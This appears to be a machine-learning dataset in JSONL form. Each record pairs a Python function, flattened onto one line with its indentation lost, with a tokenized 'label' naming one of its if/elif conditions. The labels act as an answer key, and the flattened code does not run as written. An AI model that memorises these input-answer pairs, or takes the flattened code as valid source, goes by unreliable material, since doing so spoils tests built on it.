{"input": "def seek(self, timestamp, log=True): \"\"\"Seek to a particular timestamp in the movie.\"\"\" if self.status in [PLAYING, PAUSED]: player = self._player if player and player.is_seekable(): player.set_time(int(timestamp * 1000.0)) self._vlc_clock.reset(timestamp) if self.status == PAUSED: self._pause_time = timestamp if log: logAttrib(self, log, \"seek\", timestamp)", "label": "if self . status == PAUSED :"}
{"input": "def foundNestedPseudoClass(self): i = self.pos + 1 openParen = 0 while i < len(self.source_text): ch = self.source_text[i] if ch == \"{\": return True elif ch == \"(\": # pseudoclasses can contain () openParen += 1 elif ch == \")\": if openParen == 0: return False openParen -= 1 elif ch == \";\" or ch == \"}\": return False i += 1 return False", "label": "if ch == \"{\" :"}
{"input": "def update(events): if failsToWriteToIDClasses(): print(\"Skip event: cannot write to ID classes\") return if didNameChange() or events.intersection({\"File\", \"Addon\", \"Tree\"}): updateEverything() if problems.canAutoExecute(): nodeTrees = list(iterAutoExecutionNodeTrees(events)) if len(nodeTrees) > 0: setupExecutionUnits() executeNodeTrees(nodeTrees) afterExecution() finishExecutionUnits()", "label": "if len ( nodeTrees ) > 0 :"}
{"input": "def check_all_verified(self): if not self.all_verified: new_all_verified = not self.lines.filter(verified=False).exists() if new_all_verified: self.all_verified = True if self.require_verification: self.add_log_entry( _(\"All rows requiring verification have been verified.\") ) self.require_verification = False self.save() return self.all_verified", "label": "if new_all_verified :"}
{"input": "def parse_for(cls, tagname, parser, bits, options): if bits: if bits[0] == \"for\": bits.pop(0) if len(bits): options[\"for\"] = Variable(bits.pop(0)) else: raise TemplateSyntaxError( \"%s: expected an argument \" 'after \"for\".' % tagname ) elif not cls.optional_for_parameter: raise TemplateSyntaxError( \"Unknown argument for %s tag: %r.\" % (tagname, bits[0]) )", "label": "if bits [ 0 ] == \"for\" :"}
{"input": "def _get_cuda_device(*args): # Returns cuda.Device or DummyDevice. for arg in args: if type(arg) is not bool and isinstance(arg, _integer_types): check_cuda_available() return Device(arg) if isinstance(arg, ndarray): if arg.device is None: continue return arg.device if available and isinstance(arg, Device): return arg # NOTE: This function returns DummyDevice for both NumPy and ChainerX return DummyDevice", "label": "if type ( arg ) is not bool and isinstance ( arg , _integer_types ) :"}
{"input": "def while1_test(a, b, c): while 1: if a != 2: if b: a = 3 b = 0 elif c: c = 0 else: a += b + c break return a, b, c", "label": "if b :"}
{"input": "def write_notes(self, family, father, mother): # FIXME: # if self.restrict and self.exclnotes: # return self.write_note_of_person(father) self.write_note_of_person(mother) child_ref_list = family.get_child_ref_list() if child_ref_list: for child_ref in child_ref_list: child = self.db.get_person_from_handle(child_ref.ref) if child: self.write_note_of_person(child)", "label": "if child :"}
{"input": "def GetFile(cls, session, sig, mode=\"r\"): sig = sig[: cls.HASH_LEN] while len(sig) > 0: fn = cls.SaveFile(session, sig) try: if os.path.exists(fn): return (open(fn, mode), sig) except (IOError, OSError): pass if len(sig) > 1: sig = sig[:-1] else: if \"r\" in mode: return (None, sig) else: return (open(fn, mode), sig) # Not reached return (None, None)", "label": "if os . path . exists ( fn ) :"}
{"input": "def _generate_expression(self): # turn my _format attribute into the _expression attribute e = [] for part in PARSE_RE.split(self._format): if not part: continue elif part == \"{{\": e.append(r\"\\{\") elif part == \"}}\": e.append(r\"\\}\") elif part[0] == \"{\" and part[-1] == \"}\": # this will be a braces-delimited field to handle e.append(self._handle_field(part)) else: # just some text to match e.append(REGEX_SAFETY.sub(self._regex_replace, part)) return \"\".join(e)", "label": "elif part [ 0 ] == \"{\" and part [ - 1 ] == \"}\" :"}
{"input": "def get_cfg_dict(self, with_meta=True): options_dict = self.merged_options if with_meta: if self.plugin: options_dict.update( {\"package\": \"yandextank.plugins.{}\".format(self.plugin)} ) if self.enabled is not None: options_dict.update({\"enabled\": self.enabled}) return options_dict", "label": "if self . plugin :"}
{"input": "def __str__(self): _outicalfile = self._icalfile for unit in self.units: for location in unit.getlocations(): match = re.match(\"\\\\[(?P<uid>.+)\\\\](?P<property>.+)\", location) for component in self._icalfile.components(): if component.name != \"VEVENT\": continue if component.uid.value != match.groupdict()[\"uid\"]: continue for property in component.getChildren(): if property.name == match.groupdict()[\"property\"]: property.value = unit.target if _outicalfile: return str(_outicalfile.serialize()) else: return \"\"", "label": "if component . name != \"VEVENT\" :"}
{"input": "def process_events(self, events): for event in events: key = (event.ident, event.filter) if event.ident == self._force_wakeup_fd: self._force_wakeup.drain() continue receiver = self._registered[key] if event.flags & select.KQ_EV_ONESHOT: del self._registered[key] if type(receiver) is _core.Task: _core.reschedule(receiver, outcome.Value(event)) else: receiver.put_nowait(event)", "label": "if event . flags & select . KQ_EV_ONESHOT :"}
{"input": "def forward(self, start=True, search=False, target=None, include_current=False): \"\"\"Move one step forward in the history.\"\"\" if target is None: target = self.saved_line if self.index > 1: if search: self.index -= self.find_partial_match_forward(target, include_current) elif start: self.index -= self.find_match_forward(target, include_current) else: self.index -= 1 return self.entry else: self.index = 0 return self.saved_line", "label": "if search :"}
{"input": "def _charlabels(self, options): \"\"\"Get labels for characters (PRIVATE).\"\"\" self.charlabels = {} opts = CharBuffer(options) while True: # get id and state w = opts.next_word() if w is None: # McClade saves and reads charlabel-lists with terminal comma?! break identifier = self._resolve(w, set_type=CHARSET) state = quotestrip(opts.next_word()) self.charlabels[identifier] = state # check for comma or end of command c = opts.next_nonwhitespace() if c is None: break elif c != \",\": raise NexusError(\"Missing ',' in line %s.\" % options)", "label": "elif c != \",\" :"}
{"input": "def _get_cloudstorage_bucket_iam_member_bindings(self, raw_bucket): bucket_iam_policy = raw_bucket.iam_policy member_bindings = {} if bucket_iam_policy: for binding in bucket_iam_policy._bindings: if \"legacy\" not in binding[\"role\"]: for member in binding[\"members\"]: if member not in member_bindings: member_bindings[member] = [binding[\"role\"]] else: member_bindings[member].append(binding[\"role\"]) return member_bindings", "label": "if \"legacy\" not in binding [ \"role\" ] :"}
{"input": "def _gen(): for i in dataset(): if isinstance(i, tuple) or isinstance(i, list): if fn(*i) is True: yield i else: if fn(i) is True: yield i", "label": "if fn ( i ) is True :"}
{"input": "def set_img_to_eval_imgs(self, scores, img_ids, method): for img_id, score in zip(img_ids, scores): if img_id not in self.img_to_eval: self.img_to_eval[img_id] = dict() self.img_to_eval[img_id][\"image_id\"] = img_id self.img_to_eval[img_id][method] = score", "label": "if img_id not in self . img_to_eval :"}
{"input": "def _compute_totals(self): totals = {} for entry in self.entries: for k, v in entry.nutrition_information.items(): if k not in totals: totals[k] = v else: totals[k] += v self._totals = totals", "label": "if k not in totals :"}
{"input": "def analyzeFunction(vw, funcva): for fromva, tova, rtype, rflags in vw.getXrefsFrom(funcva, v_const.REF_CODE): # You goin NOWHERE! loc = vw.getLocation(tova) if loc is None: continue # FIXME this could check for thunks to other known function pointers... va, size, ltype, linfo = loc if ltype != v_const.LOC_IMPORT: continue vw.makeFunctionThunk(funcva, linfo)", "label": "if ltype != v_const . LOC_IMPORT :"}
{"input": "def clear_output_directory(self): files = os.listdir(os.path.join(\"functional\", \"output\")) for f in files: if f in (\"README.txt\", \".svn\", \"CVS\"): continue # don't touch the infrastructure path = os.path.join(\"functional\", \"output\", f) if os.path.isdir(path): shutil.rmtree(path) else: os.remove(path)", "label": "if f in ( \"README.txt\" , \".svn\" , \"CVS\" ) :"}
{"input": "def test_output_files_as_none_string(self): for name in \"Output\", \"Report\", \"Log\", \"XUnit\", \"DebugFile\": attr = (name[:-4] if name.endswith(\"File\") else name).lower() settings = RobotSettings({name.lower(): \"NoNe\"}) assert_equals(settings[name], None) if hasattr(settings, attr): assert_equals(getattr(settings, attr), None)", "label": "if hasattr ( settings , attr ) :"}
{"input": "def is_rotated(box_list): if type(box_list) == np.ndarray: return box_list.shape[1] == 5 elif type(box_list) == list: if box_list == []: # cannot decide the box_dim return False return np.all( np.array( [ (len(obj) == 5) and ((type(obj) == list) or (type(obj) == np.ndarray)) for obj in box_list ] ) ) return False", "label": "if box_list == [ ] :"}
{"input": "def visit_loop(self): v = self.vS.top_front() i = self.iS.top_front() num_edges = len(self.graph[v].edges) # Continue traversing out-edges until none left. while i <= num_edges: # Continuation if i > 0: # Update status for previously traversed out-edge self.finish_edge(v, i - 1) if i < num_edges and self.begin_edge(v, i): return i += 1 # Finished traversing out edges, update component info self.finish_visiting(v)", "label": "if i > 0 :"}
{"input": "def GetConvertersByClass(value_cls): \"\"\"Returns all converters that take given value as an input value.\"\"\" try: return ExportConverter.converters_cache[value_cls] except KeyError: results = [ cls for cls in ExportConverter.classes.values() if cls.input_rdf_type == value_cls ] if not results: results = [DataAgnosticExportConverter] ExportConverter.converters_cache[value_cls] = results return results", "label": "if not results :"}
{"input": "def migrate_Context(self): for old_obj in self.session_old.query(self.model_from[\"Context\"]): new_obj = self.model_to[\"Context\"]() for key in new_obj.__table__.columns._data.keys(): if key not in old_obj.__table__.columns._data.keys(): continue value = getattr(old_obj, key) if key == \"tip_timetolive\" and value < 0: value = 0 setattr(new_obj, key, value) self.session_new.add(new_obj)", "label": "if key == \"tip_timetolive\" and value < 0 :"}
{"input": "def _bind_to(self, url, bind): \"\"\"Bind to a Connectable in the caller's thread.\"\"\" if isinstance(bind, util.string_types + (url.URL,)): try: self.context._engine = self.__engines[bind] except KeyError: e = sqlalchemy.create_engine(bind) self.__engines[bind] = e self.context._engine = e else: # TODO: this is squirrely. we shouldn't have to hold onto engines # in a case like this if bind not in self.__engines: self.__engines[bind] = bind self.context._engine = bind", "label": "if bind not in self . __engines :"}
{"input": "def _gen_Less(self, args, ret_type): result = [] for lhs, rhs in pairwise(args): if ret_type == real_type: result.append(self.builder.fcmp_ordered(\"<\", lhs, rhs)) elif ret_type == int_type: result.append(self.builder.icmp_signed(\"<\", lhs, rhs)) else: raise CompileError() return reduce(self.builder.and_, result)", "label": "if ret_type == real_type :"}
{"input": "def _store_pickle_output(self, pickle_output): if pickle_output: if self.output_options.output is None: self.error(\"Can't use without --output\", \"pickle-output\") elif not load_pytd.is_pickle(self.output_options.output): self.error( \"Must specify %s file for --output\" % load_pytd.PICKLE_EXT, \"pickle-output\", ) self.output_options.pickle_output = pickle_output", "label": "if self . output_options . output is None :"}
{"input": "def resolve_identifier(self, identifier): if \":\" in identifier: conn, pn = identifier.split(\":\") if pn.isdigit(): pn = int(pn) return self.resolve_identifier(self.connector_table[conn][pn]) else: return identifier", "label": "if pn . isdigit ( ) :"}
{"input": "def add_braces_and_labels(self): for attr in \"horizontal_parts\", \"vertical_parts\": if not hasattr(self, attr): continue parts = getattr(self, attr) for subattr in \"braces\", \"labels\": if hasattr(parts, subattr): self.add(getattr(parts, subattr))", "label": "if hasattr ( parts , subattr ) :"}
{"input": "def on_janitor_selection_changed(self, selection): model, iter = selection.get_selected() if iter: if self.janitor_model.iter_has_child(iter): iter = self.janitor_model.iter_children(iter) plugin = model[iter][self.JANITOR_PLUGIN] for row in self.result_model: if row[self.RESULT_PLUGIN] == plugin: self.result_view.get_selection().select_path(row.path) log.debug(\"scroll_to_cell: %s\" % row.path) self.result_view.scroll_to_cell(row.path)", "label": "if self . janitor_model . iter_has_child ( iter ) :"}
{"input": "def canonical_standard_headers(self, headers): interesting_headers = [\"content-md5\", \"content-type\", \"date\"] hoi = [] if \"Date\" in headers: del headers[\"Date\"] headers[\"Date\"] = self._get_date() for ih in interesting_headers: found = False for key in headers: lk = key.lower() if headers[key] is not None and lk == ih: hoi.append(headers[key].strip()) found = True if not found: hoi.append(\"\") return \"\\n\".join(hoi)", "label": "if not found :"}
{"input": "def boolean(value): if isinstance(value, str): v = value.lower() if v in (\"1\", \"yes\", \"true\", \"on\"): return True if v in (\"0\", \"no\", \"false\", \"off\"): return False raise ValueError(value) return bool(value)", "label": "if v in ( \"0\" , \"no\" , \"false\" , \"off\" ) :"}
{"input": "def get_extension_for_class(self, extclass): if extclass is UnrecognizedExtension: raise TypeError( \"UnrecognizedExtension can't be used with \" \"get_extension_for_class because more than one instance of the\" \" class may be present.\" ) for ext in self: if isinstance(ext.value, extclass): return ext raise ExtensionNotFound(\"No {} extension was found\".format(extclass), extclass.oid)", "label": "if isinstance ( ext . value , extclass ) :"}
{"input": "def sysargs_to_mainargs(): \"\"\"builds main args from sys.argv\"\"\" relative_out_dir = None if len(sys.argv) > 1 and sys.argv[1].startswith(\"--\"): a = sys.argv.pop(1) if a.startswith(\"--help\"): print(__doc__) sys.exit(1) elif a.startswith(\"--reldir=\"): relative_out_dir = a[len(\"--reldir=\") :] else: print(\"*** Error, Unknown option:\", a) print(__doc__) sys.exit(1) other_session = sys.argv[1] return relative_out_dir, other_session", "label": "if a . startswith ( \"--help\" ) :"}
{"input": "def _scanDirectory(self, dirIter, f): while len(f) < 250: try: info = next(dirIter) except StopIteration: if not f: raise EOFError return f if isinstance(info, defer.Deferred): info.addCallback(self._cbScanDirectory, dirIter, f) return else: f.append(info) return f", "label": "if not f :"}
{"input": "def register_options(config_block): for name in common_block: safe_declare_common_option(config_block, name) if config_block.get(name)._argparse is None: config_block.get(name).declare_as_argument()", "label": "if config_block . get ( name ) . _argparse is None :"}
{"input": "def _loc(obj): try: fn = getattr(obj, \"__file__\", None) if fn is not None: return \" @%s\" % (fn,) obj = getattr(obj, \"im_func\", obj) code = getattr(obj, \"__code__\", None) if code is not None: return \" @%s:%s\" % (code.co_filename, code.co_firstlineno) except Exception: pass return \"\"", "label": "if fn is not None :"}
{"input": "def _remove_temporary_files(self, temporary_files): \"\"\"Internal function for cleaning temporary files\"\"\" for file_object in temporary_files: file_name = file_object.name file_object.close() if os.path.exists(file_name): os.remove(file_name) arff_file_name = file_name + \".arff\" if os.path.exists(arff_file_name): os.remove(arff_file_name)", "label": "if os . path . exists ( file_name ) :"}
{"input": "def show(self): \"\"\"Overrides Qt Method\"\"\" QWidget.show(self) self.emit(SIGNAL(\"visibility_changed(bool)\"), True) if self.editor is not None: text = self.editor.get_selected_text() if len(text) > 0: self.search_text.setEditText(text) self.search_text.lineEdit().selectAll() self.refresh() else: self.search_text.lineEdit().selectAll() self.search_text.setFocus()", "label": "if len ( text ) > 0 :"}
{"input": "def flush_input() -> None: if not self.is_done: # Get keys, and feed to key processor. keys = self.input.flush_keys() self.key_processor.feed_multiple(keys) self.key_processor.process_keys() if self.input.closed: f.set_exception(EOFError)", "label": "if self . input . closed :"}
{"input": "def get_default_taxes_and_charges(master_doctype, tax_template=None, company=None): if not company: return {} if tax_template and company: tax_template_company = frappe.db.get_value( master_doctype, tax_template, \"company\" ) if tax_template_company == company: return default_tax = frappe.db.get_value( master_doctype, {\"is_default\": 1, \"company\": company} ) return { \"taxes_and_charges\": default_tax, \"taxes\": get_taxes_and_charges(master_doctype, default_tax), }", "label": "if tax_template_company == company :"}
{"input": "def dump_prefs(self): ret = \"\" for pref in self.prefs: if type(self.prefs[pref].value) == int: value = str(self.prefs[pref].value) elif type(self.prefs[pref].value) == bool: value = \"true\" if self.prefs[pref].value == True else \"false\" else: value = '\"%s\"' % self.prefs[pref].value ret += pref + \": \" + value + \" (\" + self.prefs[pref].anon_source + \")\\n\" return ret", "label": "elif type ( self . prefs [ pref ] . value ) == bool :"}
{"input": "def dumps(o, **kwargs): \"\"\"Dumps JSON object.\"\"\" try: return _engine[1](o) except: ExceptionClass, why = sys.exc_info()[:2] if any([(issubclass(ExceptionClass, e)) for e in _engine[2]]): raise JSONError(why) else: raise why", "label": "if any ( [ ( issubclass ( ExceptionClass , e ) ) for e in _engine [ 2 ] ] ) :"}
{"input": "def main(): import sys, getopt try: opts, args = getopt.getopt(sys.argv[1:], \"ho:\", [\"help\", \"output=\"]) except getopt.GetoptError as err: usage() sys.exit(1) output = None for o, a in opts: if o in (\"-h\", \"--help\"): usage() sys.exit() elif o in (\"-o\", \"--output\"): output = a else: usage() sys.exit(1) if not args: usage() sys.exit(1) concat_flv(args, output)", "label": "if o in ( \"-h\" , \"--help\" ) :"}
{"input": "def close_group(self): \"\"\"Closes a grouping for previous filters\"\"\" if self._filters: if len(self._open_group_flag) < (len(self._close_group_flag) + 1): raise RuntimeError(\"Not enough open groups to close.\") if isinstance(self._filters[-1], ChainOperator): flt_sentence = self._filters[-2] else: flt_sentence = self._filters[-1] flt_sentence[1] = flt_sentence[1] + \")\" # closing the group self._close_group_flag.append(False) # flag a close group was added else: raise RuntimeError(\"No filters present. Can't close a group\") return self", "label": "if isinstance ( self . _filters [ - 1 ] , ChainOperator ) :"}
{"input": "def _GetPlugins(self, base_class): items = [] for name in sorted(base_class.classes.keys()): cls = base_class.classes[name] # While technically a valid plugin, UnknownOutputPlugin is only used as # a placeholder when unserializing old and now-deleted output plugins. # No need to display it in the UI. if cls == output_plugin.UnknownOutputPlugin: continue if cls.description: items.append(ApiOutputPluginDescriptor().InitFromOutputPluginClass(cls)) return items", "label": "if cls . description :"}
{"input": "def _set_helper(settings, path, value, data_type=None): path = _to_settings_path(path) method = settings.set if data_type is not None: name = None if data_type == bool: name = \"setBoolean\" elif data_type == float: name = \"setFloat\" elif data_type == int: name = \"setInt\" if name is not None: method = getattr(settings, name) method(path, value) settings.save()", "label": "if name is not None :"}
{"input": "def _url_encode_impl(obj, charset, encode_keys, sort, key): iterable = sdict() for key, values in obj.items(): if not isinstance(values, list): values = [values] iterable[key] = values if sort: iterable = sorted(iterable, key=key) for key, values in iterable.items(): for value in values: if value is None: continue if not isinstance(key, bytes): key = str(key).encode(charset) if not isinstance(value, bytes): value = str(value).encode(charset) yield url_quote_plus(key) + \"=\" + url_quote_plus(value)", "label": "if not isinstance ( key , bytes ) :"}
{"input": "def validate_data(self, data, schema): verrors = ValidationErrors() provider = data[\"provider\"] if provider == \"custom\": for k in (\"custom_ddns_server\", \"custom_ddns_path\"): if not data[k]: verrors.add(f\"{schema}.{k}\", \"Required when using a custom provider.\") elif provider not in (await self.provider_choices()): verrors.add(f\"{schema}.provider\", \"Please select a valid provider.\") verrors.check()", "label": "if not data [ k ] :"}
{"input": "def render(self): x = \"<span>\" for idx, arg in enumerate(self.args, start=1): if isinstance(arg, (tuple, list)): value, desc = arg else: value, desc = arg, arg attrs = self.attrs.copy() attrs[\"name\"] = self.name attrs[\"type\"] = \"radio\" attrs[\"value\"] = value attrs[\"id\"] = self.name + str(idx) if self.value == value: attrs[\"checked\"] = \"checked\" x += \"<input %s/> %s\" % (attrs, net.websafe(desc)) x += \"</span>\" return x", "label": "if isinstance ( arg , ( tuple , list ) ) :"}
{"input": "def search_rotate(array, val): low, high = 0, len(array) - 1 while low <= high: mid = (low + high) // 2 if val == array[mid]: return mid if array[low] <= array[mid]: if array[low] <= val <= array[mid]: high = mid - 1 else: low = mid + 1 else: if array[mid] <= val <= array[high]: low = mid + 1 else: high = mid - 1 return -1", "label": "if val == array [ mid ] :"}
{"input": "def detect(get_page): retval = False for vector in WAF_ATTACK_VECTORS: page, headers, code = get_page(get=vector) retval = ( re.search( r\"wangzhan\\.360\\.cn\", headers.get(\"X-Powered-By-360wzb\", \"\"), re.I ) is not None ) if retval: break return retval", "label": "if retval :"}
{"input": "def _recalculate(self): # If the parent's path has changed, recalculate _path parent_path = tuple(self._get_parent_path()) # Make a copy if parent_path != self._last_parent_path: spec = self._path_finder(self._name, parent_path) # Note that no changes are made if a loader is returned, but we # do remember the new parent path if spec is not None and spec.loader is None: if spec.submodule_search_locations: self._path = spec.submodule_search_locations self._last_parent_path = parent_path # Save the copy return self._path", "label": "if spec is not None and spec . loader is None :"}
{"input": "def _get_directory_item_content(filename, return_binary, encoding): content = None if os.path.exists(filename): if return_binary: mode = \"rb\" encoding = None else: mode = \"r\" with codecs.open(filename, mode, encoding=encoding) as file_obj: content = file_obj.read() return content", "label": "if return_binary :"}
{"input": "def randint(self, beg, end): if beg == 1 and end == 10: self.icnt1_10 += 1 if self.icnt1_10 > len(self.RINT1_10): self.icnt1_10 = 1 return self.RINT1_10[self.icnt1_10 - 1] if beg == 65 and end == 90: self.icnt65_90 += 1 if self.icnt65_90 > len(self.RINT65_90): self.icnt65_90 = 1 return self.RINT65_90[self.icnt65_90 - 1] raise Exception(\"Not implemented\")", "label": "if self . icnt1_10 > len ( self . RINT1_10 ) :"}
{"input": "def _get_two_devices(self, require_same_type=False): tpus = extensions.tpu_devices() if FLAGS.requires_tpu: if len(tpus) == 2: res = tpus else: raise ValueError( \"This test requires 2 TPU cores but %s are found\" % len(tpus) ) else: if len(tpus) == 2: res = tpus elif self._hasGPU() and not require_same_type: res = (\"CPU:0\", \"GPU:0\") else: res = (\"CPU:0\", \"CPU:1\") return res", "label": "if len ( tpus ) == 2 :"}
{"input": "def edge2str(self, nfrom, nto): if isinstance(nfrom, ExprCompose): for i in nfrom.args: if i[0] == nto: return \"[%s, %s]\" % (i[1], i[2]) elif isinstance(nfrom, ExprCond): if nfrom.cond == nto: return \"?\" elif nfrom.src1 == nto: return \"True\" elif nfrom.src2 == nto: return \"False\" return \"\"", "label": "elif nfrom . src1 == nto :"}
{"input": "def send_frame_imm(self, frame): # send s_frame if frame.name == \"s_frame\": frame.RecvSeq = self.rsn if self.t2_caller: gevent.kill(self.t2_caller) self.telegram_count = 0 response_string = \" \".join(hex(n) for n in frame.build()) logger.info( \"%s <--- s_frame %s (%s)\", self.address, response_string, self.session_id ) return self.sock.send(frame.build())", "label": "if self . t2_caller :"}
{"input": "def lin2lin(cp, size, size2): _check_params(len(cp), size) _check_size(size2) if size == size2: return cp new_len = (len(cp) / size) * size2 result = create_string_buffer(new_len) for i in range(_sample_count(cp, size)): sample = _get_sample(cp, size, i) if size < size2: sample = sample << (4 * size2 / size) elif size > size2: sample = sample >> (4 * size / size2) sample = _overflow(sample, size2) _put_sample(result, size2, i, sample) return result.raw", "label": "elif size > size2 :"}
{"input": "def tangent(self, t): result = np.array([0, 0, 0]) o = self.omega for i, coeff in enumerate(self.coeffs): j = i // 2 if i % 2 == 0: result += -(j + 1) * o * coeff * sin((j + 1) * o * t) else: result += (j + 1) * o * coeff * cos((j + 1) * o * t) return result", "label": "if i % 2 == 0 :"}
{"input": "def _run(self): when_pressed = 0.0 pressed = False while not self._done.is_set(): now = time.monotonic() if now - when_pressed > self._debounce_time: if GPIO.input(self._channel) == self._expected: if not pressed: pressed = True when_pressed = now self._trigger(self._pressed_queue, self._pressed_callback) else: if pressed: pressed = False self._trigger(self._released_queue, self._released_callback) self._done.wait(0.05)", "label": "if now - when_pressed > self . _debounce_time :"}
{"input": "def check_dimensions(nrow, ncol): if nrow is not None: if nrow < 1: warn( \"'nrow' must be greater than 0. \" \"Your value has been ignored.\", PlotnineWarning, ) nrow = None else: nrow = int(nrow) if ncol is not None: if ncol < 1: warn( \"'ncol' must be greater than 0. \" \"Your value has been ignored.\", PlotnineWarning, ) ncol = None else: ncol = int(ncol) return nrow, ncol", "label": "if ncol < 1 :"}
{"input": "def visit_FunctionDef(self, node: ast.FunctionDef) -> None: \"\"\"Handles FunctionDef node and set context.\"\"\" if self.current_function is None: self.add_entry( node.name ) # should be called before setting self.current_function if self.is_final(node.decorator_list): self.add_final_entry(node.name) if self.is_overload(node.decorator_list): self.add_overload_entry(node) self.context.append(node.name) self.current_function = node for child in node.body: self.visit(child) self.context.pop() self.current_function = None", "label": "if self . is_final ( node . decorator_list ) :"}
{"input": "def ret(stmt, params=()): match = limit_re.match(stmt) if match: if match.group(2) == \"?\": n = params[-1] params = params[:-1] else: n = int(match.group(2)) store.sql(match.group(1), params) return [store.cursor.fetchone() for i in xrange(n)] return selectall(stmt, params)", "label": "if match . group ( 2 ) == \"?\" :"}
{"input": "def OnBodyClick(self, event=None): try: c = self.c p = c.currentPosition() if not g.doHook(\"bodyclick1\", c=c, p=p, v=p, event=event): self.OnActivateBody(event=event) c.k.showStateAndMode(w=c.frame.body.bodyCtrl) g.doHook(\"bodyclick2\", c=c, p=p, v=p, event=event) except: g.es_event_exception(\"bodyclick\")", "label": "if not g . doHook ( \"bodyclick1\" , c = c , p = p , v = p , event = event ) :"}
{"input": "def verify_settings(rst_path: Path) -> Iterator[Error]: for setting_name, default in find_settings_in_rst(rst_path): actual = getattr(app.conf, setting_name) if isinstance(default, timedelta): default = default.total_seconds() if isinstance(actual, Enum): actual = actual.value if actual != default: yield Error( reason=\"mismatch\", setting=setting_name, default=default, actual=actual, )", "label": "if isinstance ( actual , Enum ) :"}
{"input": "def fromVariant(variant): if hasattr(QtCore, \"QVariant\") and isinstance(variant, QtCore.QVariant): t = variant.type() if t == QtCore.QVariant.String: return str(variant.toString()) elif t == QtCore.QVariant.Double: return variant.toDouble()[0] elif t == QtCore.QVariant.Int: return variant.toInt()[0] elif t == QtCore.QVariant.Bool: return variant.toBool() elif t == QtCore.QVariant.Invalid: return None else: raise ValueError('Unsupported QVariant type \"%s\"' % variant.typeName()) else: return variant", "label": "elif t == QtCore . QVariant . Int :"}
{"input": "def decode_list(self, prop, value): if not isinstance(value, list): value = [value] if hasattr(prop, \"item_type\"): item_type = getattr(prop, \"item_type\") dec_val = {} for val in value: if val is not None: k, v = self.decode_map_element(item_type, val) try: k = int(k) except: k = v dec_val[k] = v value = dec_val.values() return value", "label": "if val is not None :"}
{"input": "def has_valid_checksum(self, number): given_number, given_checksum = number[:-1], number[-1] calculated_checksum = 0 parameter = 7 for item in given_number: fragment = str(int(item) * parameter) if fragment.isalnum(): calculated_checksum += int(fragment[-1]) if parameter == 1: parameter = 7 elif parameter == 3: parameter = 1 elif parameter == 7: parameter = 3 return str(calculated_checksum)[-1] == given_checksum", "label": "elif parameter == 3 :"}
{"input": "def encoder(s, *args, **kwargs): r = [] _in = [] for c in s: if ord(c) in PRINTABLE: doB64(_in, r) r.append(c.encode()) elif c == \"&\": doB64(_in, r) r.append(b\"&-\") else: _in.append(c) doB64(_in, r) return (b\"\".join(r), len(s))", "label": "elif c == \"&\" :"}
{"input": "def construct_instances(self, row, keys=None): collected_models = {} for i, (key, constructor, attr, conv) in enumerate(self.column_map): if keys is not None and key not in keys: continue value = row[i] if key not in collected_models: collected_models[key] = constructor() instance = collected_models[key] if attr is None: attr = self.cursor.description[i][0] if conv is not None: value = conv(value) setattr(instance, attr, value) return collected_models", "label": "if conv is not None :"}
{"input": "def try_to_find_osquery(self): extention = \"\" if platform.system() == \"Windows\": extention = \".exe\" try: return resources.get_resource(\"osqueryi\" + extention) except IOError as e: # Maybe it is installed on the system. if platform.system() == \"Windows\": result = r\"c:\\ProgramData\\osquery\\osqueryi.exe\" if os.access(result, os.R_OK): return result else: # Try to find it somewhere on the system. return spawn.find_executable(\"osqueryi\") raise e", "label": "if platform . system ( ) == \"Windows\" :"}
{"input": "def get_cached_stats(self, split=tfds.Split.TRAIN): \"\"\"Returns basic statistics for cached dataset.\"\"\" self.assert_cached() if split not in self._stats: stats_path = get_stats_path(self.cache_dir, split) if not tf.io.gfile.exists(stats_path): raise ValueError( \"Stats do not exist for '%s' split: %s\" % (self.name, split) ) with tf.io.gfile.GFile(stats_path) as f: self._stats[split] = json.load(f) return self._stats[split]", "label": "if not tf . io . gfile . exists ( stats_path ) :"}
{"input": "def _network_connections_in_results(data): for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"connections\" in plugin_result[\"device\"]: for conn in plugin_result[\"device\"][\"connections\"]: if conn[\"connection_type\"] == ConnectionType.network.name: return True return False", "label": "if plugin_result [ \"status\" ] == \"error\" :"}
{"input": "def register_asyncio_task(self, task, module_path=None): if self._current[\"metadata\"] is None: if module_path is None: raise RuntimeError(\"module_path must be supplied for late-binded tasks\") else: self.list[module_path][\"asyncio.task\"].append(task) else: self._current[\"asyncio.task\"].append(task)", "label": "if module_path is None :"}
{"input": "def __prep_write_total(self, comments, main, fallback, single): lower = self.as_lowercased() for k in [main, fallback, single]: if k in comments: del comments[k] if single in lower: parts = lower[single].split(\"/\", 1) if parts[0]: comments[single] = [parts[0]] if len(parts) > 1: comments[main] = [parts[1]] if main in lower: comments[main] = lower.list(main) if fallback in lower: if main in comments: comments[fallback] = lower.list(fallback) else: comments[main] = lower.list(fallback)", "label": "if len ( parts ) > 1 :"}
{"input": "def api(request, app): marker = request.keywords.get(\"api\") bpkwargs = {} kwargs = {} if marker: if \"prefix\" in marker.kwargs: bpkwargs[\"url_prefix\"] = marker.kwargs.pop(\"prefix\") if \"subdomain\" in marker.kwargs: bpkwargs[\"subdomain\"] = marker.kwargs.pop(\"subdomain\") kwargs = marker.kwargs blueprint = Blueprint(\"api\", __name__, **bpkwargs) api = restplus.Api(blueprint, **kwargs) app.register_blueprint(blueprint) yield api", "label": "if \"prefix\" in marker . kwargs :"}
{"input": "def _get_pip_index_urls(sources): index_urls = [] trusted_hosts = [] for source in sources: url = source.get(\"url\") if not url: continue index_urls.append(url) if source.get(\"verify_ssl\", True): continue host = six.moves.urllib.parse.urlparse(source[\"url\"]).hostname trusted_hosts.append(host) return index_urls, trusted_hosts", "label": "if not url :"}
{"input": "def add_aggregation_data(self, payload): for timestamp, payload_data in payload.items(): if \"interval_aggs\" in payload_data: self.unwrap_interval_buckets( timestamp, None, payload_data[\"interval_aggs\"][\"buckets\"] ) elif \"bucket_aggs\" in payload_data: self.unwrap_term_buckets(timestamp, payload_data[\"bucket_aggs\"][\"buckets\"]) else: self.check_matches(timestamp, None, payload_data)", "label": "elif \"bucket_aggs\" in payload_data :"}
{"input": "def _handle_unverified_signed_presence(self, pres): verified = self.verify(pres[\"status\"], pres[\"signed\"]) if verified.key_id: if not self.get_keyid(pres[\"from\"]): known_keyids = [e[\"keyid\"] for e in self.gpg.list_keys()] if verified.key_id not in known_keyids: self.gpg.recv_keys(self.key_server, verified.key_id) self.set_keyid(jid=pres[\"from\"], keyid=verified.key_id) self.xmpp.event(\"signed_presence\", pres)", "label": "if verified . key_id not in known_keyids :"}
